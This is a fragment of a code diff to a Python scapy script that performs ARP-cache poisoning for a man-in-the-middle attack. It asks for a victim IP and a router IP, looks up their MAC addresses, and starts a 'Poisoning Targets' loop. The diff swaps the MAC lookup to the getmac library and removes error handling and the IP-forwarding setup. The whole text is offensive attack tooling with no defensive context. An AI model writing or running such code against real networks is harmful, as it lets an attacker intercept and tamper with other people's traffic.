@@ -1,27 +1,17 @@
 from scapy import *
+import getmac
 import sys
 import os
 import time
-from uuid import getnode as get_mac
 
-try:
-    interface = raw_input("[*] Enter Desired Interface: ")
-    victimIP = raw_input("[*] Enter Victim IP: ")
-    gateIP = raw_input("[*] Enter Router IP: ")
-except KeyboardInterrupt:
-    print "\n[*] User Requested Shutdown"
-    print "[*] Exiting..."
-    sys.exit(1)
 
-print "\n[*] Enabling IP Forwarding...\n"
-os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+interface = raw_input("[*] Enter Desired Interface: ")
+victimIP = raw_input("[*] Enter Victim IP: ")
+gateIP = raw_input("[*] Enter Router IP: ")
 
 
 def get_mac(IP):
-    conf.verb = 0
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
-    for snd, rcv in ans:
-        return rcv.sprintf(r"%Ether.src%")
+    return getmac.get_mac_address(IP)
 
 
 def reARP():
@@ -42,20 +32,9 @@ def trick(gm, vm):
 
 
 def mitm():
-    try:
-        victimMAC = get_mac(victimIP)
-    except Exception:
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        print "[!] Couldn't Find Victim MAC Address"
-        print "[!] Exiting..."
-        sys.exit(1)
-    try:
-        gateMAC = get_mac(gateIP)
-    except Exception:
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        print "[!] Couldn't Find Gateway MAC Address"
-        print "[!] Exiting..."
-        sys.exit(1)
+    victimMAC = get_mac(victimIP)
+    gateMAC = get_mac(gateIP)
+
     print "[*] Poisoning Targets..."
     while 1:
         try:
